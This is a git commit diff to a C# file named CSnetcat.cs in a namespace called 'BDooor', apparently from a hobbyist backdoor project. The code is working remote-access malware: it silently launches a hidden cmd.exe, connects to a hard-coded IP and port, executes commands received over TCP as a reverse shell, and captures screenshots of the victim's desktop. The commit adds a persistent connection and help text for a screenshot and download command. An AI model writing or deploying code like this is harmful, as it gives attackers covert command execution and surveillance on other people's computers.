f0d205d8ad7c66ead3bddbd1859b6b4f49f37e22
toballz <42551340+toballz@users.noreply.github.com>
2020-08-20 09:41:27 -0400

    Update CSnetcat.cs

--- pshell/CSnetcat.cs
+++ pshell/CSnetcat.cs
@@ -20,10 +20,13 @@ namespace BDooor
 	{
 		public static string _ip = "192.168.0.25";
 		public static int _po = 2522;
+		TcpClient client;
 
 		public Form1()
         {
             InitializeComponent();
+			//#start tcp connection
+			client = new TcpClient(_ip, _po);
 
 			StreamTCP();
         }
@@ -35,40 +38,42 @@ namespace BDooor
             Rectangle captureRectangle = Screen.AllScreens[0].Bounds;
             Graphics captureGraphics = Graphics.FromImage(captureBitmap);
             captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
-            captureBitmap.Save(Path.GetTempPath()+@"\Capture.jpg", ImageFormat.Jpeg);
-
+            captureBitmap.Save(Path.GetTempPath()+@"\xapture.jpg", ImageFormat.Jpeg);
+			
         }
-
+		public void do_SendFile()
+        {
+            
+			
+        }
 
 
         //## netCat payload 2
 		static StreamWriter streamWriter;
 		public void StreamTCP()
 		{
-			using (TcpClient client = new TcpClient(_ip, _po)){
-				using (Stream stream = client.GetStream()){
-					using (StreamReader rdr = new StreamReader(stream)){
-						streamWriter = new StreamWriter(stream);
+			using (Stream stream = client.GetStream()){
+				using (StreamReader rdr = new StreamReader(stream)){
+					streamWriter = new StreamWriter(stream);
 
 
-						Process p = new Process();
-						p.StartInfo.FileName = "cmd.exe";
-						p.StartInfo.CreateNoWindow = true;
-						p.StartInfo.UseShellExecute = false;
-						p.StartInfo.RedirectStandardOutput = true;
-						p.StartInfo.RedirectStandardInput = true;
-						p.StartInfo.RedirectStandardError = true;
-						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputData);
-						p.Start();
-						p.BeginOutputReadLine();
+					Process p = new Process();
+					p.StartInfo.FileName = "cmd.exe";
+					p.StartInfo.CreateNoWindow = true;
+					p.StartInfo.UseShellExecute = false;
+					p.StartInfo.RedirectStandardOutput = true;
+					p.StartInfo.RedirectStandardInput = true;
+					p.StartInfo.RedirectStandardError = true;
+					p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputData);
+					p.Start();
+					p.BeginOutputReadLine();
 
-						string tcpInput = "";
-						while (true){
-							tcpInput = rdr.ReadLine();//get tcp input
+					string tcpInput = "";
+					while (true){
+						tcpInput = rdr.ReadLine();//get tcp input
 
-							p.StandardInput.WriteLine(LlTcpInput(tcpInput));//execute tcp input
-							tcpInput = "";//clear previous strInput
-						}
+						p.StandardInput.WriteLine(LlTcpInput(tcpInput));//execute tcp input
+						tcpInput = "";//clear previous strInput
 					}
 				}
 			}
@@ -93,18 +98,15 @@ namespace BDooor
 			string cmdCommand = wodr;
 			switch (wodr)
 			{
-				case "ls":
-					cmdCommand = "dir";
-					break;
-				case "ls -Force":
-					cmdCommand = "dir -Force";
+				case "??":
+				case "-hep":
+					cmdCommand = "echo \"[??|-hep] [-Screenshot] [-dload?download]\"";
 					break;
 				case "-screenshot":
 					do_ScreenShot();
 					cmdCommand = "echo \"screenshot captured..\"";
 					break;
-				case "??":
-				case "-hep":
+				case "-dload":
 					cmdCommand = "echo \"[??|-hep] [ls] [-Screenshot]\"";
 					break;
 			}
